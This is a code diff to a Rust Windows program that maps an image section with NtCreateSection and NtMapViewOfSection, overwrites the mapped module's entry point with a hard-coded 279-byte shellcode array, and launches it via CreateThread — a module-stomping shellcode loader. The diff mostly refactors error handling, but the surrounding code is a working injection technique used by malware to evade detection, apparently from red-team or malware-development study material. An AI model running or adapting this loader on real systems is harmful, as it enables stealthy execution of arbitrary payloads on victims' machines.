@@ -1,18 +1,22 @@
+use std::{ffi::c_void, ptr::null_mut};
 use ntapi::ntmmapi::{NtMapViewOfSection, ViewShare};
-use std::ffi::c_void;
-use std::ptr::null_mut;
 use windows::{
     core::s,
     Wdk::Storage::FileSystem::NtCreateSection,
     Win32::{
         Foundation::{GENERIC_READ, HANDLE},
-        Storage::FileSystem::{CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_MODE, OPEN_EXISTING},
+        Storage::FileSystem::{
+            CreateFileA, FILE_ATTRIBUTE_NORMAL, 
+            FILE_SHARE_MODE, OPEN_EXISTING
+        },
         System::{
             Diagnostics::Debug::IMAGE_NT_HEADERS64,
-            Memory::{VirtualProtect, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
-            Memory::{PAGE_EXECUTE_READWRITE, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_IMAGE},
-            SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE},
             Threading::{CreateThread, THREAD_CREATION_FLAGS},
+            SystemServices::{IMAGE_DOS_HEADER, IMAGE_NT_SIGNATURE},
+            Memory::{
+                VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, 
+                PAGE_READONLY, PAGE_READWRITE, SECTION_ALL_ACCESS, SEC_IMAGE
+            }, 
         },
     },
 };
@@ -39,8 +43,8 @@ const SHELLCODE: [u8; 279] = [
     0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
 ];
 
-fn main() {
-    let address = load_file().expect("[!] load_file Failed With Status");
+fn main() -> Result<(), Box<dyn std::error::Error>> {
+    let address = load_file()?;
     let module = address.0;
     let entry_point = address.1;
     println!("[+] Base Address: {:?}", module);
@@ -49,20 +53,21 @@ fn main() {
     unsafe {
         println!("[+] Changing protection from AddressOfEntryPoint to PAGE_READWRITE");
         let mut old_protect = PAGE_PROTECTION_FLAGS(0);
-        VirtualProtect(entry_point,SHELLCODE.len(),PAGE_READWRITE,&mut old_protect).expect("[!] VirtualProtect Failed With Status");
+        VirtualProtect(entry_point,SHELLCODE.len(),PAGE_READWRITE,&mut old_protect)?;
 
         println!("[+] Copying Shellcode to AddressOfEntryPoint");
         std::ptr::copy_nonoverlapping(SHELLCODE.as_ptr(), entry_point as _, SHELLCODE.len());
 
         println!("[+] Back to the old protection");
-        VirtualProtect(entry_point, SHELLCODE.len(), old_protect, &mut old_protect).expect("[!] VirtualProtect (2) Failed With Status");
+        VirtualProtect(entry_point, SHELLCODE.len(), old_protect, &mut old_protect)?;
 
-        CreateThread(None,0,Some(std::mem::transmute(entry_point)),None,THREAD_CREATION_FLAGS(0), None).expect("[!] CreateThread Failed With Status");
+        CreateThread(None,0,Some(std::mem::transmute(entry_point)),None,THREAD_CREATION_FLAGS(0), None)?;
 
-        println!("[+] Shellcode Executed!!!");
+        println!("[+] Shellcode Executed!");
         std::thread::sleep(std::time::Duration::from_secs(10));
 
-    };
+        Ok(())
+    }
 }
 
 fn load_file() -> Result<(*mut c_void, *mut c_void), String> {
@@ -75,7 +80,7 @@ fn load_file() -> Result<(*mut c_void, *mut c_void), String> {
             OPEN_EXISTING,
             FILE_ATTRIBUTE_NORMAL,
             None,
-        ).expect("CreateFile Failed With Status");
+        ).map_err(|e| format!("[!] CreateFileA Failed With Error: {e}"))?;
 
         let mut section = HANDLE::default();
         let status = NtCreateSection(
@@ -89,10 +94,10 @@ fn load_file() -> Result<(*mut c_void, *mut c_void), String> {
         );
 
         if status.is_err() {
-            return Err("[!] NtCreateSection Failed".to_string());
+            return Err(format!("[!] NtCreateSection Failed With Status: {:?}", status));
         }
 
-        let mut mapped_module: *mut ntapi::winapi::ctypes::c_void = null_mut();
+        let mut mapped_module = null_mut();
         let mut view_size = 0;
         let status = NtMapViewOfSection(
             section.0 as _,
@@ -108,13 +113,13 @@ fn load_file() -> Result<(*mut c_void, *mut c_void), String> {
         );
 
         if status != 0 {
-            return Err("[!] NtMapViewOfSection Failed".to_string());
+            return Err(format!("[!] NtMapViewOfSection Failed With Status: {}", status));
         }
 
         let dos_header = mapped_module as *mut IMAGE_DOS_HEADER;
         let nt_header = (mapped_module as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
         if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
-            return Err("IMAGE SIGNATURE INVALID".to_string());
+            return Err(String::from("IMAGE SIGNATURE INVALID"));
         }
 
         let entry_point = (mapped_module as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut c_void;
